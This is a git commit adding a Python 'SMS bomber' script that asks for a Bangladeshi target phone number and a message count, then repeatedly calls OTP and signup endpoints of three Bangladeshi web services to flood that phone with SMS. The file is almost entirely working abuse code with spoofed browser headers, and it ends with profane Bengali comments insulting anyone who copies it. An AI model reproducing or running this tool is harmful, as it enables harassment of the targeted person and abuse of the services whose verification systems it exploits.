134cbe71de88b1d4ac81710e32633fe118f526ce
Mahfuz KhaN <144543500+MAHFUZ-444-C9B4R@users.noreply.github.com>
2023-09-11 08:55:29 +0600

    Add files via upload

---
+++ SMS-BOOMBER-444.py
@@ -0,0 +1,103 @@
+import os
+print("\033[1;92m [[[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]]] TOOLS INSTALLLING PLEASE WAIT. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   [[[🤘 ]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]]] TOOLS INSTALL COMPLETE \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]][[🤘]]] UPDATE CHECKING DONE\033[1;30m")
+os.system('espeak -a 300 " WELCOME TO MAHFUZ CYBER WORLD  "')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://www.facebook.com/ami.tor.abbu.murgi")
+logo3="""
+       __  __       _      __           
+ |  \/  | __ _| |__  / _|_   _ ____
+ | |\/| |/ _` | '_ \| |_| | | |_  /
+ | |  | | (_| | | | |  _| |_| |/ / 
+ |_|  |_|\__,_|_| |_|_|  \__,_/___|
+                                   
+\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m𝗠𝗔𝗛𝗙𝗨𝗭-𝟰𝟰𝟰\033[1;39m━━━━━━━━━━━━━━━━━━━━┓
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★]𝙈𝙖𝙝𝙛𝙪𝙯 𝗞𝗵𝗮𝗡\033[1;39m         ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★]𝙈𝙖𝙝𝙛𝙪𝙯 𝗞𝗛𝗔 𝗡\033[1;39m         ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★]𝗠𝗔𝗛𝗙𝗨𝗭-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥\033[1;39m       ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+𝟴𝟴𝟬𝟭𝟳𝟱𝟳𝟰𝟭𝟮𝟰𝟲𝟯\033[1;39m     ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★]𝗦𝗠𝗦 𝗕𝗢𝗢𝗠𝗕𝗘𝗥\033[1;39m     ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝗙𝗥𝗘𝗘\033[1;39m            ┃
+ \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31𝗖𝟵𝗕𝟰𝗥\033[1;39m━━━━━━━━━━━━━━━━━━━━┛"""
+os.system('espeak -a 300 "Author Mahfuz Khan "')
+os.system('espeak -a 300 "Facebook  Mahfuz Khan "')
+os.system('espeak -a 300 "Whathapp ****"')
+os.system('espeak -a 300 "Github 𝗠𝗔𝗛𝗙𝗨𝗭-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥 "')
+os.system('espeak -a 300 "Telegram ******"')
+os.system('espeak -a 300 "Imo ********"')
+os.system('espeak -a 300 "From Bangladesh "')
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m𝗠𝗔𝗛𝗙𝗨𝗭-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥 SMS WAS SENT DONE🤘")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m𝗠𝗔𝗛𝗙𝗨𝗭-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥 SMS WAS SENT DONE🤘")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46𝗠𝗔𝗛𝗙𝗨𝗭-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥 SMS WAS SENT DONE🤘")
+    
+  else:
+    pass
+os.system("clear")
+                            
+
+#madarcod ase geli script curi korte 🙂
+#bancod tk khoroc kore nijeo to sikhte paros
+#bokachoda Madarchod Sc to Nili Abar Abbu Dake Jas
+#Sayenal Sorry.....Tomare Boli Ni
+#Onno Jara Nibe Tader Bolsi
